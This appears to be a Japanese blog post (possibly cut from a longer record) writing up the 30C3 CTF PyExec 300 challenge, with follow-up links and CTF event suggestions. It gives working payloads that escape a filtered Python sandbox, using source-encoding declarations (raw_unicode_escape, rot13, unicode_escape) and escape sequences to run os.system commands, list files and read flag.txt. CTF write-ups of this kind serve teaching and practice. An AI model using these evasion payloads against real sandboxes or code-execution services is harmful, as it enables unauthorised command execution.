\u3067\u304d\u306a\u3044\u554f\u984c\u306f\u89e3\u6c7a\u3067\u304d\u307e\u3059\u3002\u3067\u3082\u3001\u62ec\u5f27\u3084\u30c9\u30c3\u30c8\u304c\u4f7f\u3048\u306a\u3044\u554f\u984c\u304c\u6b8b\u308a\u307e\u3059\u3002\nrot13\u4ee5\u5916\u306ecording\u304c\u4f7f\u3048\u306a\u3044\u304b\u8abf\u3079\u3066\u307f\u305f\u3068\u3053\u308d\u3001Python\u30c9\u30ad\u30e5\u30e1\u30f3\u30c8\u306b\u66f8\u3044\u3066\u3042\u308b\u6a19\u6e96\u30a8\u30f3\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u306e\u3046\u3061\u3001\u300c\u88ab\u6f14\u7b97\u5b50\u306e\u578b\u300d\u304c\u300cUnicode string\u300d\u306e\u3082\u306e\u304c\u4f7f\u3048\u308b\u3088\u3046\u3067\u3059\u3002\nhttp://docs.python.jp/2/library/codecs.html#standard-encodings\n\u305d\u308c\u3092CTF\u30c1\u30fc\u30e0\u30e1\u30a4\u30c8\u306b\u7d39\u4ecb\u3057\u305f\u3068\u3053\u308d\u3001coding:raw_unicode_escape \u3067\u30d5\u30e9\u30b0\u304c\u53d6\u308c\u305f!! \u3068\u306e\u5409\u5831\u304c\u5c4a\u304d\u307e\u3057\u305f\u3002\n\u79c1\u3082\u305d\u308c\u3092\u4f7f\u3063\u3066 os.system('ls') \u3092\u5b9f\u884c\u3057\u3066\u307f\u307e\u3057\u305f\u3002import \u306f\u4f7f\u3048\u306a\u3044\u3051\u3069\u3001\u5148\u982d\u306e i \u3092 \\u0069 \u306b\u3059\u308b\u306a\u3069\u3057\u3066\u56de\u907f\u3057\u3001\u8a18\u53f7\u3082 \\u???? \u3067\u56de\u907f\u3067\u304d\u307e\u3059\u3002\n\n```py:ls\n#coding:raw_unicode_escape\n\\u0069mport os\nos\\u002esystem\\u0028\\u0027ls\\u0027\\u0029\n```\n\n```txt:ls\u51fa\u529b\u7d50\u679c\nflag.txt\nstatic\nwebapp.py\n```\n\nflag.txt \u3068\u3044\u3046\u30d5\u30a1\u30a4\u30eb\u304c\u3042\u308b\u3053\u3068\u304c\u308f\u304b\u3063\u305f\u306e\u3067\u3001os.system(\"cat flag.txt\") \u3092\u5b9f\u884c\u3057\u3066\u307f\u307e\u3059\u3002\n\n```py:cat\u3000flag.txt\n#coding:raw_unicode_escape\n\\u0069mport os\nos\\u002esystem\\u0028\\u0027cat flag\\u002etxt\\u0027\\u0029\n```\n\n```txt:cat\u3000flag.txt\u51fa\u529b\u7d50\u679c\n30C3_2a2766d9cf4a137d517a8227bd71d59d\n```\n\n30C3_2a2766d9cf4a137d517a8227bd71d59d \u3092 submit \u3057\u3066 300\u70b9 \u3092\u5f97\u70b9\u3067\u304d\u307e\u3057\u305f\u3002\n\nCTF\u5927\u4f1a\u304c\u7d42\u308f\u308b\u3068\u3001\u5404\u30c1\u30fc\u30e0\u304c\u3069\u3046\u3084\u3063\u3066\u89e3\u3044\u305f\u304b\u3092Writeup\u3068\u3057\u3066\u516c\u958b\u3059\u308b\u306e\u304c\u98a8\u7fd2\u306b\u306a\u3063\u3066\u3044\u308b\u306e\u3067\u3059\u304c\u3001\u305d\u306e\u4e2d\u306b coding:rot13 \u3067\u89e3\u3044\u3066\u308b\u30c1\u30fc\u30e0\u304c\u3042\u308a\u3001\u305d\u306e\u624b\u6cd5\u3092\u307f\u3066\u66f4\u306b\u52c9\u5f37\u306b\u306a\u308a\u307e\u3057\u305f\u3002\nstring\u30e2\u30b8\u30e5\u30fc\u30eb\u3067\u5b9a\u7fa9\u3055\u308c\u3066\u3044\u308b\u7279\u6b8a\u6587\u5b57\u5217punctuation\u3092\u5909\u6570\u306b\u5c55\u958b\u3057\u3066\u3001\u6587\u5b57\u5217\u9023\u7d50\u3057\u3066\u5b9f\u884c\u3057\u305f\u3044\u6587\u5b57\u5217\u3092\u4f5c\u308a\u51fa\u3057\u3001 exec \u3067\u5b9f\u884c\u3059\u308b\u3068\u3044\u3046\u65b9\u6cd5\u3067\u3057\u305f\u3002\nhttp://rocco.io/ctf/2013/12/29/30C3-CTF-PyExec-300.html\n\n```py:coding:rot13\nfrom os import listdir\nfrom string import lowercase, punctuation, whitespace\n\na, b, c, d, e, f, g, h, i, j,\\\nk, l, m, n, o, p, q, r, s, t,\\\nu, v, w, x, y, z = lowercase\n\n_, _, _, _, _, _, _,\\\nlparen, rparen,\\\n_, _, _, _,\\\ndot,\\\n_, _, _, _,\\\neq,\\\n_, _, _, _, _, _, _, _, _, _, _, _, _ = punctuation\n\n_, _, _, _, _, space = whitespace\n\n# lst = listdir(dot)\nexec  l + s + t + eq +\\\n      l + i + s + t + d + i + r +\\\n      lparen + d + o + t + rparen\n\n_, flag, _, _, _, _, _, _, _ = lst\n\n# print open(flag).read()\nexec  p + r + i + n + t + space +\\\n      o + p + e + n +\\\n      lparen + f + l + a + g + rparen +\\\n      dot + r + e + a + d + lparen + rparen\n```\n\n\u4ed6\u306b\u3001coding:unicode_escape \u3067\u89e3\u3044\u3066\u308b\u30c1\u30fc\u30e0\u3082\u3042\u308a\u307e\u3057\u305f\u3002unicode_escape \u3060\u3068 \\x?? \u5f62\u5f0f\u3067\u6307\u5b9a\u3067\u304d\u308b\u3093\u3067\u3059\u306d\u3002\nhttp://delimitry.blogspot.ru/2013/12/30c3-ctf-2013-sandbox-300-pyexec-writeup.html\n\nCTF\u5927\u4f1a\u958b\u50ac\u60c5\u5831\u3092\u307e\u3068\u3081\u305f\u308a\u3001\u53c2\u52a0\u30c1\u30fc\u30e0\u306e\u4e16\u754c\u30e9\u30f3\u30ad\u30f3\u30b0\u3092\u4ed8\u3051\u3066\u3044\u308b\u30b5\u30a4\u30c8\u3082\u3042\u308a\u307e\u3059\u306e\u3067\u3001\u8208\u5473\u3092\u6301\u3063\u305f\u65b9\u306fJeopardy(\u30d1\u30cd\u30eb\u30af\u30a4\u30ba)\u5f62\u5f0f\u306e\u30aa\u30f3\u30e9\u30a4\u30f3\u5927\u4f1a\u306b\u6311\u6226\u3057\u3066\u307f\u3066\u306f\u3044\u304b\u304c\u3067\u3057\u3087\u3046\u304b\u3002\nRate:10\uff5e20\u306e\u5927\u4f1a\u304c\u521d\u5fc3\u8005\u5411\u3051\u3067\u3059\u300230C3 CTF \u306f Rate:50 \u3067\u96e3\u3057\u304b\u3063\u305f\u3067\u3059\u3002Rate:60\u4ee5\u4e0a\u306f\u304b\u306a\u308a\u96e3\u3057\u3044\u3068\u601d\u3044\u307e\u3059\u3002\nhttps://ctftime.org/event/list/upcoming\n\n\u65e5\u672c\u3067\u3082\u3001\u4eca\u6708\u672b(2014\u5e741\u670825\u65e5(\u571f)12:00\uff5e26\u65e5(\u65e5)12:00\u306e24\u6642\u9593)\u306bSECCON\u306eCTF\u30aa\u30f3\u30e9\u30a4\u30f3\u4e88\u9078\u304c\u3042\u308a\u307e\u3059\u306e\u3067\u3001\u8208\u5473\u3092\u6301\u3063\u305f\u65b9\u306f\u53c2\u52a0\u3057\u3066\u307f\u3066\u306f\u3044\u304b\u304c\u3067\u3057\u3087\u3046\u304b\u3002\u5236\u9650\u3055\u308c\u305fPython\u30a4\u30f3\u30bf\u30fc\u30d7\u30ea\u30bf\u3092\u653b\u7565\u3059\u308b\u554f\u984c\u306f\u51fa\u306a\u3055\u305d\u3046\u3067\u3059\u304c\u2026\nhttp://2013.seccon.jp/online-quals2013.html", "tags": ["Python", "CTF"]}